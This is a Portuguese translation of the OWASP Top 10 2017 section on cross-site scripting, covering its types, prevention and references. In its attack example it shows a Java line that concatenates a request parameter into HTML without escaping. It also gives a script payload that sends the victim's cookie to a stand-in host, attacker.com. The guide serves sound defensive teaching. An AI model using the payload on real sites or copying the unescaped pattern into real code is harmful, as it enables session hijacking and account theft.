# A7:2017 Cross-Site Scripting (XSS)

| Atacantes / Vetores de Ataque | Falhas de Segurança | Impacto |
| -- | -- | -- |
| Nível de acesso : Explorabilidade 3 | Predomínio 3 : Detectabilidade 3 | Tecnicidade 2 : Negócio |
| Ferramentas automáticas podem detetar e tirar partido dos 3 tipos de XSS. Existem ferramentas grátis capazes de explorar este problema. | XSS é o segundo maior risco no Top 10 da OWASP e cerca de dois terços das aplicações são vulneráveis a este tipo de ataque. Existem ferramentas automáticas capazes de encontrar problemas de XSS em tecnologías bastantes populares como PHP, J2EE / JSP e ASP.NET. | O impacto do XSS é moderado para Reflected and DOM XSS mas severo para Stored XSS, onde a execução de código remotamente permite ao atacante roubar credenciais, sessões ou até mesmo infectar a máquina da vítima com malware. |

## A minha aplicação é vulnerável?

Existem 3 tipos de XSS que normalmente atacam o browser dos utilizadores:

* **Reflected XSS**: A aplicação ou API incluem no seu HTML input inserido pelo utilizador, sendo que este não foi devidamente sanitizado. Um ataque bem sucedido pode permitir ao atacante executar qualquer tipo de código HTML e JavaScript no browser da vítima. Normalmente a vítima terá de aceder a uma página maliciosa para que seja infectada.
* **Stored XSS**: A aplicação ou API armazenam informação não sanitizada inserida pelo utilizador. Esta informação poderá depois ser mostrada numa página a outro utilizador ou administrador e ser utilizada para inserir algum tipo de código malicioso na página. Este tipo de XSS é considerado de risco alto ou crítico.
* **DOM XSS**: É um ataque onde o código maligno do atacante é inserido no DOM de uma página dinamicamente. Ao contrário do Reflected e Stored XSS em que o servidor é comprometido, o DOM XSS acontece apenas no lado do cliente.

Ataques de XSS incluem riscos tais como: roubo de sessão, roubo de contas, alteração do DOM, download de software malicioso, key logging e outros.

## Como posso evitar?

Para prevenir o XSS, é necessário identificar e tratar corretamente a informação controlada pelo utilizador. Para isso, podemos:

* Utilizar frameworks que sanitizem automaticamente e corretamente o input inserido pelo utilizador como é o caso de frameworks como Ruby on Rails e React JS. É preciso entender as limitações destas frameworks e tratar corretamente desses casos.
* Escapar corretamente informação desconhecida do pedido HTTP tendo em conta o contexto onde esta informação vai ser inserida no HTML (body, attribute, JavaScript, CSS ou URL) vai resolver os riscos de Reflected e Stored XSS. O documento [OWASP Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) inclui detalhes de como deve ser escapada a informação desconhecida.
* Aplicar o encoding correto quando se faz alguma modificação na página no lado do cliente previne o DOM XSS. Quando isto não é possível, podemos também utilizar algumas das técnicas referidas no documento OWASP Cheat Sheet 'XSS Prevention'.
* Adicionar regras de [Content Security Policy (CSP)](https://developer.mozilla.org/pt-PT/docs/Web/HTTP/CSP) na aplicação é uma defesa muito boa contra XSS. É muito eficaz contra XSS se não existirem outro tipo de vulnerabilidades que possibilitem a inclusão de código malicioso através de ficheiros locais da aplicação.

## Exemplo de Ataque

**Cenário #1**: A aplicação usa informação não confiável na construção do seu HTML, sem validação ou sanitização:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`

O atacante altera o parâmetro "CC" no browser para:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

Isto irá fazer com que a sessão da vítima seja enviada para a página do atacante. A partir daqui o atacante será capaz de se fazer passar pela vítima.

**Nota**: Os atacantes podem tirar partido do XSS para derrotar qualquer mecanismo de defesa automática contra [Cross-Site Request Forgery (CSRF)](https://developer.mozilla.org/pt-PT/docs/Glossary/CSRF).

## Referências

### OWASP

* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### Externas

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
